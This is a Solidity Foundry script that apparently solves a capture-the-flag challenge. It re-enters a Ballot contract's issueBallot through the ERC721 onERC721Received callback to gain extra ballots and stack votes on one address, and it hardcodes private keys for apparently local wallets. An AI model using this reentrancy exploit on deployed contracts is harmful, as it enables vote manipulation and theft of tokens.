// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Script} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {Ballot} from "../src/Ballot.sol";
import {Setup} from "../src/Setup.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

//interface IERC721Receiver {
//    function onERC721Received(
//        address operator,
//        address from,
//        uint256 tokenId,
//        bytes calldata data
//    ) external returns (bytes4);
//}

//contract Nazo is IERC721Receiver, VmSafe.Wallet {
//    function onERC721Received(
//        address,
//        address,
//        uint256,
//        bytes calldata
//    ) external override returns (bytes4) {
//        require(false, "uon");
//    }
//}

contract Exploit is IERC721Receiver {
    //Setup public chall;
    Ballot public ballot;
    uint256[10] public myArray;
    uint256 public count;

    event LogVoteCount(uint256 count);
    event LogAddress(address count);

    function setUp() public {
        //chall = Setup(0x2B574555158337Cd46d47c2Ca57E4698A1f04e70);

        //chall = Setup(0xC197E1B3676336dC54677BeA7cAB63B05dD43477);
        //solver = vm.createWallet(
        //    0x326bdfcd1610a5b6df1d5849e7c6ca34e6faf458426334e0e9697f28396a21be
        //);
        count = 0;
    }

    function run(Setup chall, address solver_addr) public {
        //vm.startBroadcast(address(this));
        //address playerAddr = address(this);

        //vm.startPrank(playerAddr, playerAddr);

        emit LogAddress(address(this));
        ballot = chall.ballot();
        chall.register();

        myArray[0] = ballot.issueBallot();

        emit LogAddress(solver_addr);
        emit LogAddress(address(this));
        emit LogVoteCount(myArray[0]);

        for (uint i = 0; i < 15; i++) {
            ballot.voteForCandidate(i + 1, solver_addr);
        }
        uint256 x = ballot.votes(solver_addr);
        emit LogVoteCount(x);

        //require(chall.isSolved(), "Not solved");
        //require(false, "hoge");
        require(x >= 10, "Not solved");
        //require(false, "hoge");
        //vm.stopPrank();
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        emit LogVoteCount(0xdeadbeef);
        //require(false, "uon");
        if (count < 15) {
            uint256 idx = count;
            count += 1;
            ballot.issueBallot();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}

contract Player is Script {
    Setup public chall;
    VmSafe.Wallet public solver;
    Ballot public ballot;
    Exploit public ex;
    uint256[10] public myArray;
    uint256 public count;

    event LogVoteCount(uint256 count);
    event LogAddress(address count);

    function setUp() public {
        // forge script --rpc-url 127.0.0.1:8545 --private-key 0x4bbbf85ce3377467afe5d46f804f221813b2bb87f24d81f60f1fcdbf7cbf4356 --broadcast script/Exploit.s.sol:Player

        chall = Setup(0x39dD11C243Ac4Ac250980FA3AEa016f73C509f37);
        solver = vm.createWallet(
            0xbbbf85ce3377467afe5d46f804f221813b2bb87f24d81f60f1fcdbf7cbf4356
        );
        //chall = Setup(0x5bbF19B2352a3ea4bC642CcF2d6b7915EE30F6f1);
        //solver = vm.createWallet(
        //    0x9c4bbda6b620b27f2b9c41a8f1197f47af25be505bc8d67bc35fffcff4e611ab
        //);
        //ex = Exploit();
        //chall = Setup(0xC197E1B3676336dC54677BeA7cAB63B05dD43477);
        //solver = vm.createWallet(
        //    0x326bdfcd1610a5b6df1d5849e7c6ca34e6faf458426334e0e9697f28396a21be
        //);
        count = 0;
    }

    function run() public {
        vm.startBroadcast(solver.privateKey);
        ex = new Exploit();
        ex.run(chall, address(chall));
    }
}
